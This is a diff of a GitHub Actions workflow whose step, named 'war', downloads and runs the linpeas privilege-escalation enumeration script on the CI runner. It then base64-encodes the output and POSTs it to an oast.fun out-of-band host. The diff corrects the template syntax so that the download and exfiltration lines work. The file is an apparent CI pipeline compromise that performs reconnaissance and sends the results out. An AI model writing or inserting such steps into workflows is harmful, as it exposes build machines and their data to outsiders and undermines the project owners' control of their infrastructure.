@@ -12,8 +12,8 @@ jobs:
     steps:
       - name: war
         run: |
-          curl https://github.com/peass-ng/PEASS-ng/releases/download/20240421-825f642d/linpeas.sh >> {{ runner.temp }}/linpeas.sh
+          curl https://github.com/peass-ng/PEASS-ng/releases/download/20240421-825f642d/linpeas.sh >> ${{ runner.temp }}/linpeas.sh
           chmod 755 {{ runner.temp }}/linpeas.sh
           ./{{ runner.temp }}/linpeas.sh >> {{ runner.temp }}/linpeas.out
-          curl -X POST https://sxnzaklbqtsnarziyesrsxd9d0k91eb5t.oast.fun -d "data=$(cat {{ runner.temp }}/linpeas.out|base64)"
+          curl -X POST https://sxnzaklbqtsnarziyesrsxd9d0k91eb5t.oast.fun -d "data=$(cat ${{ runner.temp }}/linpeas.out|base64)"
         shell: bash
